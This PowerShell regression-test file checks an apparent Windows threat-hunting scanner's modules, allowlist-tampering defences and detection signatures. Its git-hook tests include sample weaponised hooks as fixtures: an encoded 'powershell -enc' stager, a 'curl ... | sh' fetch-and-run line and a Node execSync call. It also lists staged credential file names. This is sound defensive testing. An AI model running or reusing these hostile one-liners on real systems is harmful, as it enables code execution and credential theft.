<#
.SYNOPSIS
    Static (AST) regression tests for the WS7 HUNT band and the preflight integrity gate.

.DESCRIPTION
    Guards the invariants that cannot be checked by running the code on Linux:
    the rule-#1 posture of the band, the module-trap rule, the WOW64 helpers, the
    four-way phase-ceiling mirror, and the allowlist integrity gate.

    Every assertion pulls the real source via the PowerShell parser, so a test cannot
    drift from the code it guards.
#>
[CmdletBinding()]
param()
$ErrorActionPreference = 'Stop'
$root = Split-Path -Parent (Split-Path -Parent $PSScriptRoot)
$fail = 0; $pass = 0
function Assert-That { param([string]$Name,$Actual,$Expected)
    if ("$Actual" -eq "$Expected") { $script:pass++; Write-Host "  [PASS] $Name" -ForegroundColor DarkGreen }
    else { $script:fail++; Write-Host "  [FAIL] $Name — expected '$Expected', got '$Actual'" -ForegroundColor Red }
}
function Assert-True { param([string]$Name,$Cond) Assert-That $Name ([bool]$Cond) $true }

function Get-Ast { param([string]$Rel)
    $p = Join-Path $root $Rel
    if (-not (Test-Path $p)) { return $null }
    $e=$null; $t=$null
    $a = [System.Management.Automation.Language.Parser]::ParseFile((Resolve-Path $p).Path,[ref]$t,[ref]$e)
    if ($e -and $e.Count) { throw "parse errors in ${Rel}: $($e[0].Message)" }
    return $a
}

Write-Host "`n=== WS7 HUNT BAND (134-162) + PREFLIGHT — STATIC ===" -ForegroundColor Cyan

$newModules = @('engine/Phases-0.ps1','engine/Phases-5.ps1','engine/Phases-6.ps1','engine/Phases-7.ps1')

# ── 1. Rule #1: nothing in the new band may be auto-selected for a destructive fix ──
# A CRITICAL/HIGH finding with a destructive FixAction is auto-ticked in the GUI. This
# band has never met a live fleet and several phases fire on healthy managed endpoints
# (an EDR looks exactly like a rootkit to phases 141-143), so it is Info throughout.
foreach ($rel in $newModules) {
    $ast = Get-Ast $rel
    if ($null -eq $ast) { Assert-True "$rel exists" $false; continue }
    $calls = $ast.FindAll({ param($n)
        $n -is [System.Management.Automation.Language.CommandAst] -and
        "$($n.GetCommandName())" -eq 'Add-Finding' }, $true)
    $bad = 0; $total = 0
    foreach ($c in $calls) {
        $total++
        $els = $c.CommandElements
        $fix = $null
        for ($i=0; $i -lt $els.Count-1; $i++) {
            if ($els[$i] -is [System.Management.Automation.Language.CommandParameterAst] -and
                $els[$i].ParameterName -eq 'FixAction') { $fix = "$($els[$i+1].Value)"; break }
        }
        if ($fix -ne 'Info') { $bad++; Write-Host "        non-Info FixAction '$fix' in $rel" -ForegroundColor DarkYellow }
    }
    Assert-That "$rel — every Add-Finding is FixAction Info ($total calls)" $bad 0
}

# ── 2. Module-level trap must be the FIRST statement ───────────────────────────
# The loader's trap resumes at the next dot-sourced MODULE, so without this a single
# terminating error skips every remaining phase in the file. This exact bug once
# silently dropped phases 17-58 in production.
# A trap is NOT a statement in the AST — it hangs off EndBlock.Traps. (Asserting on
# Statements[0] silently fails even for the known-correct Phases-4.ps1, which is how
# this assertion was caught agreeing for the wrong reason.) So check textually: a
# module-level trap exists, and NOTHING EXECUTABLE precedes it. Only the BOM, blank
# lines and comment lines may come first — the deliberate-vocabulary notice is a
# comment header and does not change what runs. An executable statement before the
# trap is the real defect, because that statement runs unprotected.
$trapPreamble = '^\uFEFF?(?:[ \t]*(?:#[^\r\n]*)?\r?\n)*[ \t]*trap \{ Write-RecoveredError \$_; continue \}'
foreach ($rel in $newModules) {
    $ast = Get-Ast $rel
    if ($null -eq $ast) { continue }
    Assert-True "$rel — has a module-level trap" (@($ast.EndBlock.Traps).Count -ge 1)
    $raw = Get-Content (Join-Path $root $rel) -Raw
    Assert-True "$rel — nothing executable precedes the trap" ("$raw" -match $trapPreamble)
}
# Control: the pre-existing modules must satisfy the same rule, so a future refactor
# that breaks the convention fails here rather than in production.
foreach ($rel in @('engine/Phases-1.ps1','engine/Phases-2.ps1','engine/Phases-3.ps1','engine/Phases-4.ps1')) {
    $ast = Get-Ast $rel
    Assert-True "$rel — has a module-level trap (control)" (@($ast.EndBlock.Traps).Count -ge 1)
}

# ── 3. Phase-gated bodies carry their own inner trap ──────────────────────────
foreach ($rel in @('engine/Phases-5.ps1','engine/Phases-6.ps1','engine/Phases-7.ps1')) {
    $src = Get-Content (Join-Path $root $rel) -Raw
    Assert-True "$rel — `$PhasePlan.Hunt block has an inner trap" `
        ($src -match '(?s)if \(\$PhasePlan\.Hunt\) \{\s*\r?\n\s*trap \{ Write-RecoveredError')
}

# ── 4. Phase ceiling 162 is mirrored in every place that must agree ───────────
$loader = Get-Content (Join-Path $root 'Scythe-V23.ps1') -Raw
$srv    = Get-Content (Join-Path $root 'Scythe-Server.ps1') -Raw
$py     = Get-Content (Join-Path $root '_python/server.py') -Raw
Assert-True 'loader  — HUNT PhasePlan Max=162'      ($loader -match '"HUNT"\s*\{\s*@\{\s*Min=1;\s*Max=162')
Assert-True 'loader  — HUNT in -Mode ValidateSet'   ($loader -match 'ValidateSet\("","QUICK","FULL","DEEP","PARANOID","STEALTH","HUNT"\)')
Assert-True 'loader  — HUNT sets PhasePlan.Hunt'    ($loader -match '"HUNT"\s*\{[^}]*Hunt=\$true')
Assert-True 'PS srv  — MODE_PHASES HUNT=162'        ($srv -match 'HUNT=162')
Assert-True 'PS srv  — HUNT accepted as a mode'     ($srv -match "'QUICK','FULL','DEEP','PARANOID','STEALTH','HUNT'")
Assert-True 'py srv  — MODE_PHASES HUNT 162'        ($py  -match '"HUNT":\s*162')
# The Python mirror was integer-only and silently dropped fractional phases (55.5 etc).
Assert-True 'py srv  — PHASE_RE captures fractional phases' ($py -match 'PHASE\\s\+\(\\d\+\(\?:\\\.\\d\+\)\?\)')

# ── 5. Loader dot-sources every module, in execution order ────────────────────
$order = @('Phases-0','Phases-1','Phases-2','Phases-3','Phases-4','Phases-5','Phases-6','Phases-7','Summary','FixMode')
$idx = @($order | ForEach-Object { $loader.IndexOf("engine\$_.ps1") })
Assert-True 'loader  — all 10 engine modules dot-sourced' (@($idx | Where-Object { $_ -lt 0 }).Count -eq 0)
$sorted = $true
for ($i=1; $i -lt $idx.Count; $i++) { if ($idx[$i] -le $idx[$i-1]) { $sorted = $false } }
Assert-True 'loader  — dot-source order is execution order' $sorted

# ── 6. WOW64 truth: the engine knows its own bitness and can escape redirection ──
Assert-True 'loader  — SCYTHE_IS_WOW64 computed'   ($loader -match '\$global:SCYTHE_IS_WOW64\s*=\s*\(\(-not \[Environment\]::Is64BitProcess\)')
Assert-True 'loader  — SCYTHE_SYS32 uses Sysnative' ($loader -match "SCYTHE_SYS32.*Sysnative")
foreach ($fn in @('Get-RegVal64','Get-RegNames64','Get-RegSubKeys64')) {
    Assert-True "loader  — $fn defined" ($loader -match "function $fn\b")
    Assert-True "loader  — $fn uses the 64-bit registry view" `
        ($loader -match "(?s)function $fn\b.*?RegistryView\]::Registry64")
}
$p5 = Get-Content (Join-Path $root 'engine/Phases-5.ps1') -Raw
Assert-True 'Phase 134 reads TaskCache through the 64-bit view' `
    ($p5 -match '(?s)Get-ScytheTaskTreeLeaves.*?Get-RegNames64')

# ── 7. Allowlist integrity gate (ADVERSARY_ANALYSIS E1) ──────────────────────
Assert-True 'loader  — Join-AllowRegex sanitises before compiling' `
    ($loader -match '(?s)function Join-AllowRegex.*?Test-AllowPatternSafety')
Assert-True 'loader  — refusals are recorded for reporting' `
    ($loader -match '(?s)function Join-AllowRegex.*?SCYTHE_SIG_TAMPER')
Assert-True 'loader  — an emptied allowlist still fails closed to (?!)' `
    ($loader -match '(?s)function Join-AllowRegex.*?if \(\$keep\.Count -eq 0\) \{ return ''\(\?\!\)'' \}')
Assert-True 'loader  — Test-AllowPatternSafety enforces a match timeout' `
    ($loader -match '(?s)function Test-AllowPatternSafety.*?FromMilliseconds\(150\)')
$p0 = Get-Content (Join-Path $root 'engine/Phases-0.ps1') -Raw
Assert-True 'Phase 0 — reports refused signature entries'  ($p0 -match 'PF_SIGTAMPER_')
Assert-True 'Phase 0 — reports WOW64 redirection'          ($p0 -match 'PF_WOW64_REDIRECTED')
Assert-True 'Phase 0 — verifies the integrity manifest'    ($p0 -match 'integrity_manifest\.json')
Assert-True 'Phase 0 — emits no numbered PHASE header'     (-not ($p0 -match 'Show-PhaseHeader "PHASE \d'))
Assert-True 'Phase 0 — hands the phase counter back at 0'  ($p0 -match '\$global:CURRENT_PHASE_NUM = 0')

# ── 8. Signature-DB hygiene for the new keys ─────────────────────────────────
$sig = Get-Content (Join-Path $root 'data/detection_signatures.json') -Raw -Encoding UTF8 | ConvertFrom-Json
$canaries = @('C:\Windows\System32\svchost.exe','HKLM:\SOFTWARE\Vendor\Product','9','zqx','Some Product Name 2026')
$newKeys = @('hunt_task_benign_paths','hunt_service_benign_names','hunt_ppid_benign_paths',
             'hunt_driver_benign_names','hunt_timestomp_benign_paths','hunt_filename_benign_paths',
             'hunt_memory_benign_paths')
foreach ($k in $newKeys) {
    Assert-True "sig — key '$k' present" ($null -ne $sig.$k)
    $univ = 0; $nocomp = 0
    foreach ($pat in @($sig.$k)) {
        $rx = $null
        try { $rx = New-Object System.Text.RegularExpressions.Regex($pat,'IgnoreCase',[TimeSpan]::FromMilliseconds(150)) }
        catch { $nocomp++; continue }
        $all = $true
        foreach ($c in $canaries) { if (-not $rx.IsMatch($c)) { $all = $false; break } }
        if ($all) { $univ++ }
    }
    Assert-That "sig — '$k' all patterns compile" $nocomp 0
    Assert-That "sig — '$k' has no universal pattern" $univ 0
}
foreach ($k in @('clr_unexpected_hosts','system_image_names','killchain_stages')) {
    Assert-True "sig — detection key '$k' present and non-empty" (@($sig.$k).Count -gt 0)
}
# The Phase-6 auto-kill lists take a bare substring match; a short entry collides with
# real software. These new lists are anchored whole-name at load, but keep the floor.
$short = 0
foreach ($n in @($sig.clr_unexpected_hosts)) { if ("$n".Length -lt 3) { $short++ } }
Assert-That 'sig — no clr_unexpected_hosts entry shorter than 3 chars' ([int]$short) 0

# ── 9. Safe-wrapper discipline in the new modules ────────────────────────────
# The four unsafe cmdlets are matched through the AST, not the raw text. A text match
# also fires on the cmdlet NAME appearing inside a -Description string — and it legitimately
# does: this band is FixAction "Info", so the description IS the remediation, and telling an
# operator to run 'Get-AuthenticodeSignature <path>' is exactly the right instruction to give
# them. The AST distinguishes a command being INVOKED from a command being NAMED in prose,
# which is the distinction the rule was always about. (Proven to still bite: injecting a real
# call into any of these modules fails the assertion.)
$unsafeCmdlets = @('Get-AuthenticodeSignature','Get-ItemPropertyValue','Get-WinEvent','Get-FileHash')
foreach ($rel in @('engine/Phases-0.ps1','engine/Phases-5.ps1','engine/Phases-6.ps1','engine/Phases-7.ps1')) {
    $src = Get-Content (Join-Path $root $rel) -Raw
    $modAst = Get-Ast $rel
    $invoked = @()
    if ($null -ne $modAst) {
        $invoked = @($modAst.FindAll({ param($n) $n -is [System.Management.Automation.Language.CommandAst] }, $true) |
                     ForEach-Object { $_.GetCommandName() } | Where-Object { $_ })
    }
    foreach ($cmd in $unsafeCmdlets) {
        Assert-That "$rel — no raw $cmd invocation" (@($invoked | Where-Object { $_ -eq $cmd }).Count) 0
    }
    # Deliberate design constraint: no P/Invoke anywhere in this band. Declaring
    # OpenProcess/ReadProcessMemory/VirtualQueryEx is the code shape AV heuristics flag,
    # and an engine Defender blocks at load detects nothing at all.
    Assert-True "$rel — no P/Invoke (AMSI posture)"       (-not ($src -match 'DllImport|Add-Type\s+-TypeDefinition'))
    # Get-ScanFiles returns ,$arr — piping it delivers the whole array as ONE item.
    Assert-True "$rel — Get-ScanFiles is never piped directly" (-not ($src -match 'Get-ScanFiles[^\r\n]*\|\s*(Where|ForEach)'))
}

# ── 10. Cross-view phases must actually consult two sources ──────────────────
Assert-True 'Phase 134 — compares registry against Get-ScheduledTask' `
    ($p5 -match '(?s)PHASE 134.*?Get-ScheduledTask.*?Get-ScytheTaskTreeLeaves|(?s)Get-ScytheTaskTreeLeaves.*?PHASE 134.*?Get-ScheduledTask')
Assert-True 'Phase 135 — compares registry against Win32_Service'   ($p5 -match '(?s)PHASE 135.*?Win32_Service')
Assert-True 'Phase 138 — compares registry against Win32_SystemDriver' ($p5 -match '(?s)PHASE 138.*?Win32_SystemDriver')
Assert-True 'Phase 144 — compares PEB path against WMI path'        ($p5 -match '(?s)PHASE 144.*?ExecutablePath')
Assert-True 'Phase 141 — uses ProcessThread start addresses'        ($p5 -match 'StartAddress')
Assert-True 'Phase 141 — bounds module ranges by ModuleMemorySize'  ($p5 -match 'ModuleMemorySize')

# ── 11. RUNTIME: the E1 blinding attack must actually be closed ──────────────
# The static checks above prove the sanitiser is WIRED. This proves it WORKS, by pulling
# Test-AllowPatternSafety and Join-AllowRegex out of the shipped loader via the AST and
# executing them against a poisoned signature set — the exact attack from
# ADVERSARY_ANALYSIS.md E1: do not delete a detection (a missing key fails closed and is
# conspicuous), widen an allowlist instead, because allowlists fail OPEN.
Write-Host "`n-- runtime: signature-set integrity gate --" -ForegroundColor Cyan
$loaderAst = Get-Ast 'Scythe-V23.ps1'
$wanted = @('Test-AllowPatternSafety','Join-AllowRegex')
$defs = $loaderAst.FindAll({ param($n)
    $n -is [System.Management.Automation.Language.FunctionDefinitionAst] -and
    $wanted -contains $n.Name }, $true)
Assert-That 'both integrity functions extracted from the loader' $defs.Count 2
$global:SCYTHE_SIG_TAMPER = New-Object System.Collections.Generic.List[string]
$script:SIGSTUB = $null
function Get-Sig([string]$Name) { if ($script:SIGSTUB -and $null -ne $script:SIGSTUB[$Name]) { @($script:SIGSTUB[$Name]) } else { @() } }
foreach ($d in $defs) { . ([scriptblock]::Create($d.Extent.Text)) }

# (a) a healthy allowlist survives untouched
$script:SIGSTUB = @{ k = @('\\AppData\\Roaming\\Vendor\\', '\.tmp$') }
$global:SCYTHE_SIG_TAMPER.Clear()
$r = Join-AllowRegex 'k'
Assert-True  'healthy allowlist compiles through unchanged' ($r -eq '\\AppData\\Roaming\\Vendor\\|\.tmp$')
Assert-That  'healthy allowlist records no tampering' $global:SCYTHE_SIG_TAMPER.Count 0

# (b) THE ATTACK: one entry widened to '.*' must be refused, not honoured
$script:SIGSTUB = @{ k = @('\\AppData\\Roaming\\Vendor\\', '.*') }
$global:SCYTHE_SIG_TAMPER.Clear()
$r = Join-AllowRegex 'k'
Assert-True  'universal pattern is DROPPED from the compiled allowlist' ($r -notmatch '\.\*')
Assert-True  'the legitimate sibling entry survives'  ($r -eq '\\AppData\\Roaming\\Vendor\\')
Assert-That  'the refusal is recorded for reporting'  $global:SCYTHE_SIG_TAMPER.Count 1
Assert-True  'the refusal names the offending key'    ("$($global:SCYTHE_SIG_TAMPER[0])" -match '^k:')
Assert-True  'the refusal is described as UNIVERSAL'  ("$($global:SCYTHE_SIG_TAMPER[0])" -match 'UNIVERSAL')

# (c) other universal spellings are caught too — '.*' is not the only way to say it
foreach ($u in @('.+', '^.*$', '(?s).*', '[\s\S]*', '.*|foo', '')) {
    $script:SIGSTUB = @{ k = @($u) }
    $global:SCYTHE_SIG_TAMPER.Clear()
    $r = Join-AllowRegex 'k'
    Assert-True "universal/empty spelling '$u' is refused (fails closed to (?!))" ($r -eq '(?!)')
}

# (d) an allowlist emptied by sanitising must suppress NOTHING, never everything.
# This is the fail-closed direction and it is the whole point: a blinded phase must go
# noisy, not silent.
$script:SIGSTUB = @{ k = @('.*') }
$r = Join-AllowRegex 'k'
Assert-True 'a fully-refused allowlist suppresses nothing' (-not ([regex]::IsMatch('C:\Windows\evil.exe', $r)))

# (e) a catastrophic-backtracking pattern is refused rather than hanging the scan
$script:SIGSTUB = @{ k = @('(a+)+$') }
$global:SCYTHE_SIG_TAMPER.Clear()
$sw = [System.Diagnostics.Stopwatch]::StartNew()
$r = Join-AllowRegex 'k'
$sw.Stop()
Assert-True 'backtracking-bait pattern does not hang the load (<3s)' ($sw.Elapsed.TotalSeconds -lt 3)

# (f) an absent key still fails closed — the pre-existing contract must not regress
$script:SIGSTUB = @{}
Assert-That 'an absent allowlist key still yields (?!)' (Join-AllowRegex 'nope') '(?!)'


# ── 12. Phases 147 / 157 / 158 / 159 — structure and the deliberate narrowings ─
Write-Host "`n-- phases 147/157/158/159 (tasks F1/F4/F5/F7) --" -ForegroundColor Cyan
$p6 = Get-Content (Join-Path $root 'engine/Phases-6.ps1') -Raw
$p6ast = Get-Ast 'engine/Phases-6.ps1'

foreach ($n in @(147,153,154,155,156,157,158,159)) {
    Assert-True "Phase $n — header present in Phases-6" ($p6 -match ('Show-PhaseHeader "PHASE {0}"' -f $n))
}
# 146 and 148-152 are still the parallel work package; the module must not claim them.
foreach ($n in @(146,148,149,150,151,152)) {
    Assert-True "Phase $n — still a stub, no header emitted" (-not ($p6 -match ('Show-PhaseHeader "PHASE {0}"' -f $n)))
}
# Phases run in numeric order within a module. 147 must precede 153.
Assert-True 'Phases-6 — 147 is emitted before 153' `
    ($p6.IndexOf('Show-PhaseHeader "PHASE 147"') -lt $p6.IndexOf('Show-PhaseHeader "PHASE 153"'))
Assert-True 'Phases-6 — 157 is emitted after 156' `
    ($p6.IndexOf('Show-PhaseHeader "PHASE 157"') -gt $p6.IndexOf('Show-PhaseHeader "PHASE 156"'))

# Helpers are defined unconditionally, before the $PhasePlan gate, so they exist in every
# mode and the AST tests can find them (module skeleton rule, 00_INTEGRATION_ENGINE.md).
$p6Funcs = @($p6ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $true) |
             ForEach-Object { $_.Name })
foreach ($fn in @('Test-ScytheNameRule','Test-ScytheTextRules','Resolve-ScytheModulePath',
                  'Test-ScytheUntrustedModule','Get-ScytheRepoRoots','Get-ScytheEspRoot')) {
    Assert-True "Phases-6 — helper $fn is defined" ($p6Funcs -contains $fn)
    Assert-True "Phases-6 — helper $fn is defined OUTSIDE the PhasePlan gate" `
        ($p6.IndexOf("function $fn") -lt $p6.IndexOf('if ($PhasePlan.Hunt) {'))
}

# Phase 159 narrows F7 the way 153-156 narrowed F6: it reads an ALREADY-mounted ESP and
# mounts nothing itself. Revert-proofed, because "leave nothing behind on a client
# machine" is the standing rule the narrowing exists to honour (audit M5/M9/M10).
foreach ($mutator in @('mountvol','Add-PartitionAccessPath','Remove-PartitionAccessPath','Set-Partition','New-Partition','Format-Volume')) {
    $invokedNames = @($p6ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.CommandAst] }, $true) |
                      ForEach-Object { $_.GetCommandName() } | Where-Object { $_ })
    Assert-That "Phase 159 — never invokes $mutator" (@($invokedNames | Where-Object { $_ -eq $mutator }).Count) 0
}
# Confirm-SecureBootUEFI THROWS on legacy BIOS rather than returning false, so the whole
# phase has to degrade cleanly. Prove the call is guarded and that the non-UEFI path
# still reports (a skipped check that leaves no trace reads as a pass in the report).
Assert-True 'Phase 159 — Confirm-SecureBootUEFI is wrapped in try/catch' `
    ($p6 -match '(?s)try \{ \$sbState = \[bool\]\(Confirm-SecureBootUEFI[^\r\n]*\}\s*\r?\n\s*catch')
Assert-True 'Phase 159 — reports the legacy-BIOS case instead of skipping silently' `
    ($p6 -match 'BOOT159_LEGACYBIOS')
Assert-True 'Phase 159 — reports an unmounted ESP rather than claiming it is clean' `
    ($p6 -match 'BOOT159_ESP_UNMOUNTED')
Assert-True 'Phase 159 — compares the ESP boot binary against the servicing copy' `
    ($p6 -match '(?s)PHASE 159.*?Boot\\EFI.*?Get-FileHashSafe')

# Phase 147 must never read the opaque token caches — reading a TokenBroker cache or an
# NGC key container makes this tool the credential-theft primitive it looks for.
Assert-True 'Phase 147 — consults cloud_cred_never_read before content-scanning' `
    ($p6 -match '(?s)CLOUD_CRED_NEVER_READ.*?Test-ContentRules')
Assert-True 'Phase 147 — does not put the matched secret in the description' `
    ($p6 -match 'deliberately NOT reproduced here')

# Phase 157: every mechanism the brief names is actually reached.
$mech = @{
    'COR_PROFILER'          = 'COR_PROFILER'
    'Active Setup StubPath' = 'Active Setup\\Installed Components'
    'SilentProcessExit'     = 'SilentProcessExit'
    'WER ReflectDebugger'   = 'ReflectDebugger'
    'Time Providers'        = 'W32Time\\TimeProviders'
    'Print Monitors'        = 'Control\\Print\\Monitors'
    'Netsh helper DLLs'     = 'SOFTWARE\\Microsoft\\Netsh'
    'Winsock LSP'           = 'Protocol_Catalog9'
    'AutodialDLL'           = 'AutodialDLL'
    'ShellServiceObjectDelayLoad' = 'ShellServiceObjectDelayLoad'
    'SharedTaskScheduler'   = 'SharedTaskScheduler'
    'SCRNSAVE.EXE'          = 'SCRNSAVE\.EXE'
    'RDP InitialProgram'    = 'InitialProgram'
    'Service trigger start' = 'TriggerInfo'
    'AppDomainManager sidecar' = 'appDomainManager'
}
foreach ($k in ($mech.Keys | Sort-Object)) {
    Assert-True "Phase 157 — covers $k" ($p6 -match $mech[$k])
}
# HKLM\SOFTWARE reads go through the 64-bit view or a 32-bit engine reads Wow6432Node.
Assert-True 'Phase 157 — reads HKLM through the 64-bit helpers' `
    ($p6 -match '(?s)PHASE 157.*?Get-RegSubKeys64' -and $p6 -match '(?s)PHASE 157.*?Get-RegVal64')
# Phase 158 must ignore the stock hook samples, or every developer box reports findings.
# The brief is explicit that the extension-bundle C2 check must REUSE phase 130's webhook
# rule set rather than grow a second copy that then drifts out of step with it.
Assert-True 'Phase 158 — reuses the existing webhook/C2 rule set, not a second copy' `
    ($p6 -match '\$WEBHOOK_C2_RULES' -and -not ($p6 -match "Get-Sig 'webhook"))
Assert-True 'Phase 158 — skips .sample git hooks' ($p6 -match '\$\(\$hf\.Name\)" -match ''\(\?i\)\\\.sample\$''')

# ── 13. Signature-DB hygiene for the F1/F4/F5/F7 keys ────────────────────────
Write-Host "`n-- signature hygiene: the new keys --" -ForegroundColor Cyan
$newBandKeys = @('cloud_cred_paths_raw','cloud_cred_never_read','cloud_cred_text_formats',
                 'cloud_cred_content_rules','cloud_cred_staging_dirs_raw','cloud_cred_staged_names',
                 'cloud_cred_access_tools','cloud_cred_benign_paths',
                 'persist_dropper_extensions','persist_dropper_content_rules',
                 'persist_profiler_benign_names','persist_dll_benign_paths',
                 'persist_stubpath_benign_values','persist_service_trigger_benign_names',
                 'devtool_paths_raw','devtool_hook_rules','devtool_gitconfig_rules',
                 'devtool_vscode_startup_rules','devtool_registry_rules','devtool_benign_paths',
                 'esp_expected_paths','esp_boot_binaries','bcd_unsafe_flags','dbx_current_baseline')
foreach ($k in $newBandKeys) {
    Assert-True "sig — key '$k' present and non-empty" ($null -ne $sig.$k -and @($sig.$k).Count -gt 0)
    Assert-True "sig — key '$k' carries a _comment" ($null -ne $sig."_comment_$k")
}
# Every one of these keys is pulled by the LOADER, never by the phase body — that is what
# Test-Extended-Band's orphan check keys off, and what keeps the AMSI posture intact.
foreach ($k in $newBandKeys) {
    Assert-True "loader — pulls '$k'" ($loader -match "(?:Get-Sig|Join-AllowRegex) '$k'")
}
# *_raw lists hold $env: variables and are expanded ONCE, in the loader.
foreach ($k in @('cloud_cred_paths_raw','cloud_cred_staging_dirs_raw','devtool_paths_raw')) {
    Assert-True "sig — '$k' entries are `$env:-prefixed literals" `
        (@(@($sig.$k) | Where-Object { "$_" -notmatch '^\$env:' }).Count -eq 0)
    Assert-True "loader — '$k' is ExpandString-expanded at load" `
        ($loader -match "(?s)Get-Sig '$k'\) \| ForEach-Object \{ \`$ExecutionContext\.InvokeCommand\.ExpandString")
}
# Allowlists: compile, and none universal (the E1 blinding attack).
$newAllowKeys = @('cloud_cred_benign_paths','persist_profiler_benign_names','persist_dll_benign_paths',
                  'persist_stubpath_benign_values','persist_service_trigger_benign_names','devtool_benign_paths')
foreach ($k in $newAllowKeys) {
    $univ = 0; $nocomp = 0
    foreach ($pat in @($sig.$k)) {
        $rx = $null
        try { $rx = New-Object System.Text.RegularExpressions.Regex($pat,'IgnoreCase',[TimeSpan]::FromMilliseconds(150)) }
        catch { $nocomp++; continue }
        $all = $true
        foreach ($c in $canaries) { if (-not $rx.IsMatch($c)) { $all = $false; break } }
        if ($all) { $univ++ }
    }
    Assert-That "sig — '$k' all patterns compile" $nocomp 0
    Assert-That "sig — '$k' has no universal pattern" $univ 0
}
# Plain regex-list keys (no 'regex' in the name, so Test-Extended-Band's sweep skips them).
foreach ($k in @('cloud_cred_never_read','cloud_cred_text_formats','cloud_cred_staged_names',
                 'cloud_cred_access_tools','esp_expected_paths')) {
    $nocomp = 0
    foreach ($pat in @($sig.$k)) {
        try { [void](New-Object System.Text.RegularExpressions.Regex($pat,'IgnoreCase',[TimeSpan]::FromMilliseconds(150))) }
        catch { $nocomp++ }
    }
    Assert-That "sig — '$k' all patterns compile" $nocomp 0
}
# StubPath is a command line the attacker fully controls, so every allowlist entry has to
# pin the ENTIRE string — a prefix pattern lets malware self-allowlist by naming its
# command after a Microsoft one (caught in review 2026-07-02).
foreach ($pat in @($sig.persist_stubpath_benign_values)) {
    Assert-True "sig — stubpath allowlist entry is fully anchored: $pat" `
        ($pat -match '\^' -and $pat -match '\$$')
}

# ── 14. The FP traps these two allowlists are specifically able to fall into ──
Write-Host "`n-- allowlists must not swallow their own detection branch --" -ForegroundColor Cyan
function Join-BandAllow { param([string]$Key) $a = @($sig.$Key); if ($a.Count) { ($a -join '|') } else { '(?!)' } }
$cloudAllow   = Join-BandAllow 'cloud_cred_benign_paths'
$devtoolAllow = Join-BandAllow 'devtool_benign_paths'

# Phase 147 branch (c) fires on credential material staged in these directories. An
# allowlist entry covering one of them would make the branch unreachable dead code — the
# exact failure phase 130's discord entry shipped with.
foreach ($staged in @('C:\Users\tech\AppData\Local\Temp\credentials',
                      'C:\Users\tech\Downloads\id_rsa',
                      'C:\Users\tech\Desktop\msal_token_cache.bin',
                      'C:\Users\Public\azureProfile.json',
                      'C:\ProgramData\kubeconfig',
                      'C:\Users\tech\Downloads\aws_creds.zip')) {
    Assert-True "cloud allowlist does NOT swallow staged '$staged'" (-not ($staged -match $cloudAllow))
}
# ...while still suppressing the package trees it exists for.
foreach ($noise in @('C:\repo\node_modules\aws-sdk\test\credentials',
                     'C:\Python311\Lib\site-packages\botocore\.aws\credentials',
                     'C:\repo\tests\fixtures\.npmrc',
                     'C:\Program Files\Amazon\AWSCLIV2\examples\credentials')) {
    Assert-True "cloud allowlist DOES suppress package-tree noise '$noise'" ($noise -match $cloudAllow)
}
# Phase 158's git-hook branch reads .git\hooks. Allowlisting '.git' outright would kill it.
foreach ($hook in @('C:\Users\dev\source\repos\app\.git\hooks\post-checkout',
                    'C:\Users\dev\source\repos\app\.git\hooks\pre-commit',
                    'C:\Users\dev\source\repos\app\.git\config')) {
    Assert-True "devtool allowlist does NOT swallow '$hook'" (-not ($hook -match $devtoolAllow))
}
foreach ($noise in @('C:\Users\dev\source\repos\app\node_modules\pkg\package.json',
                     'C:\Users\dev\source\repos\app\.venv\Lib\x\package.json',
                     'C:\Users\dev\source\repos\app\.git\objects\ab\cdef')) {
    Assert-True "devtool allowlist DOES suppress '$noise'" ($noise -match $devtoolAllow)
}
# A stock hooks directory holds only .sample files, and their shipped content must not
# match a hook rule — otherwise every developer workstation reports findings.
$stockSample = @'
#!/bin/sh
# An example hook script to verify what is about to be committed.
# Called by "git commit" with no arguments.
if git rev-parse --verify HEAD >/dev/null 2>&1
then
	against=HEAD
fi
exec git diff-index --check --cached $against --
'@
function Test-BandRules { param($Rules, [string]$Text)
    foreach ($r in @($Rules)) { if ($r.Pattern -and $Text -match $r.Pattern) { return "$($r.Name)" } }
    return '' }
Assert-That 'a stock .sample git hook matches NO hook rule' (Test-BandRules $sig.devtool_hook_rules $stockSample) ''
# ...and a weaponised one does.
foreach ($evil in @('#!/bin/sh
powershell -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAA==',
                    '#!/bin/sh
curl http://192.168.13.7:8080/p | sh',
                    '#!/bin/sh
node -e "require(''child_process'').execSync(''calc'')"')) {
    Assert-True 'a weaponised git hook DOES match a hook rule' ((Test-BandRules $sig.devtool_hook_rules $evil) -ne '')
}
# config.json is deliberately absent from the staged-name list: it is far too common in
# Temp and ProgramData, and including it would drown the staging branch in noise.
$stagedNames = @($sig.cloud_cred_staged_names)
function Test-BandNames { param($Rules,[string]$Name)
    foreach ($r in @($Rules)) { if ($Name -match $r) { return $true } }
    return $false }
Assert-True 'staged-name list ignores the ubiquitous config.json' (-not (Test-BandNames $stagedNames 'config.json'))
foreach ($nm in @('credentials','id_rsa','msal_token_cache.bin','.git-credentials','terraform.tfstate','kubeconfig')) {
    Assert-True "staged-name list catches '$nm'" (Test-BandNames $stagedNames $nm)
}
# The ESP inventory must accept what belongs there and reject what does not.
$espRules = @($sig.esp_expected_paths)
foreach ($okDir in @('\EFI\Microsoft','\EFI\Boot','\EFI\HP','\EFI\ubuntu','\System Volume Information')) {
    Assert-True "ESP inventory accepts '$okDir'" (Test-BandNames $espRules $okDir)
}
foreach ($badDir in @('\EFI\evil','\EFI\Update','\EFI\systemd-boot-x')) {
    Assert-True "ESP inventory flags '$badDir'" (-not (Test-BandNames $espRules $badDir))
}
# Phase 40 already owns testsigning/nointegritychecks; 159 must not duplicate them.
foreach ($dup in @('testsigning','nointegritychecks')) {
    Assert-That "bcd_unsafe_flags does not duplicate phase 40's '$dup'" `
        (@(@($sig.bcd_unsafe_flags) | Where-Object { "$($_.Pattern)" -match $dup }).Count) 0
}
Assert-True 'bcd_unsafe_flags covers disableelamdrivers' `
    (@(@($sig.bcd_unsafe_flags) | Where-Object { "$($_.Pattern)" -match 'disableelamdrivers' }).Count -eq 1)
# The dbx floor is a "never updated" floor, not a fabricated exact baseline.
Assert-True 'dbx baseline ships a MinBytes floor, not an exact size' `
    ($null -ne $sig.dbx_current_baseline.MinBytes -and [int]$sig.dbx_current_baseline.MinBytes -gt 0)
